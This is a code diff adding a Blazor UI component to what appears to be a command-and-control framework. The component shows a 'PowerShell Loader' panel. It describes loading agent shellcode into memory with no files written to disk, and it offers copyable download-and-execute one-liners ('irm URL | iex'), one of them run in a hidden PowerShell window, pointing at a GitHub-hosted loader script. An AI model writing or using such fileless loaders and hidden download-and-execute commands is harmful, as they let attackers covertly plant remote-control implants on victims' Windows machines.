@@ -1,0 +1,86 @@
+@inject IJSRuntime JS
+
+<div class="tool-panel">
+    <div class="tool-header">
+        <h3 class="tool-title">PowerShell Loader</h3>
+        <p class="tool-subtitle">Windows-only loader — downloads and executes the agent in-process via PowerShell. No files on disk.</p>
+    </div>
+
+    <div class="loader-content">
+        <div class="loader-section">
+            <h4 class="loader-section-title">Overview</h4>
+            <p class="loader-text">
+                The PowerShell loader downloads the position-independent agent shellcode from GitHub Releases
+                and executes it in the current process via <code>VirtualAlloc</code> → <code>VirtualProtect</code> → delegate invoke.
+                No files written to disk, no third-party dependencies — requires PowerShell 5.1+ or 7+.
+            </p>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Supported Architectures</h4>
+            <div class="loader-platforms">
+                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> x86_64</span>
+                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> i386</span>
+                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> ARM64</span>
+                <span class="loader-platform"><C2Icon Name="monitor" Size="Size.Xs" /> ARMv7</span>
+            </div>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Loader URL</h4>
+            <C2InputActions Value="@_loaderUrl" ValueChanged="OnLoaderUrlChanged" Monospace BindOnInput
+                            Placeholder="https://raw.githubusercontent.com/.../loader.ps1" />
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">One-Liners</h4>
+
+            <span class="loader-command-label">PowerShell (download &amp; execute)</span>
+            <div class="loader-command">
+                <code class="loader-code">irm @_loaderUrl | iex</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"irm {_loaderUrl} | iex")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+
+            <span class="loader-command-label">PowerShell — hidden window</span>
+            <div class="loader-command">
+                <code class="loader-code">powershell -W Hidden -NoP -C "irm @_loaderUrl | iex"</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"powershell -W Hidden -NoP -C \"irm {_loaderUrl} | iex\"")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+
+            <span class="loader-command-label">CMD (invokes PowerShell)</span>
+            <div class="loader-command">
+                <code class="loader-code">powershell -NoP -C "irm @_loaderUrl | iex"</code>
+                <button class="loader-copy-btn" @onclick='() => Copy($"powershell -NoP -C \"irm {_loaderUrl} | iex\"")' title="Copy">
+                    <C2Icon Name="copy" Size="Size.Xs" />
+                </button>
+            </div>
+        </div>
+
+        <div class="loader-section">
+            <h4 class="loader-section-title">Source</h4>
+            <p class="loader-text">
+                Full source code, usage instructions, and documentation are available on GitHub.
+            </p>
+            <button class="loader-link-btn" @onclick="OpenRepo">
+                <C2Icon Name="github" Size="Size.Xs" /> Open on GitHub
+            </button>
+        </div>
+    </div>
+</div>
+
+@code {
+    private const string DefaultLoaderUrl = "https://raw.githubusercontent.com/mrzaxaryan/Position-Independent-Agent/main/loaders/windows/powershell/loader.ps1";
+    private const string RepoUrl = "https://github.com/mrzaxaryan/Position-Independent-Agent/tree/main/loaders/windows/powershell";
+
+    private string _loaderUrl = DefaultLoaderUrl;
+
+    private void OnLoaderUrlChanged(string value) => _loaderUrl = value;
+
+    private void OpenRepo() => _ = JS.InvokeVoidAsync("open", RepoUrl, "_blank");
+
+    private void Copy(string text) => _ = JS.InvokeVoidAsync("navigator.clipboard.writeText", text);
+}
